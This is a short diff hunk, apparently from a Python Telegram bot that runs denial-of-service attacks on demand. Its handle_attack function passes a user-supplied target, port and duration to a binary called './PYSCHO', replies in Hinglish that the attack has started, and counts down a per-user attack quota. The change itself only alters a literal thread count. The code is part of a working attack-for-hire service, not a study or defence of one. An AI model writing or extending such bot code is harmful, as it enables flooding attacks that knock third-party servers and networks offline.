@@ -108,7 +108,7 @@ def handle_attack(message):
         return
 
     # Execute the attack via the binary
-    full_command = f"./PYSCHO {target} {port} {time_duration} 900"
+    full_command = f"./PYSCHO {target} {port} {time_duration} {900}"
     try:
         bot.reply_to(message, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁 𝗵𝗼𝗴𝘆𝗮 𝗵𝗮 𝗶𝘀𝗽𝗲: {target}, 𝗣𝗼𝗿𝘁: {port}, 𝗧𝗶𝗺𝗲: {time_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.\n"
                               f"𝗧𝗲𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗹𝗶𝗺𝗶𝘁 𝗶𝘁𝗻𝗶 𝗵𝗮: {ATTACK_LIMIT - user['attacks'] - 1}")
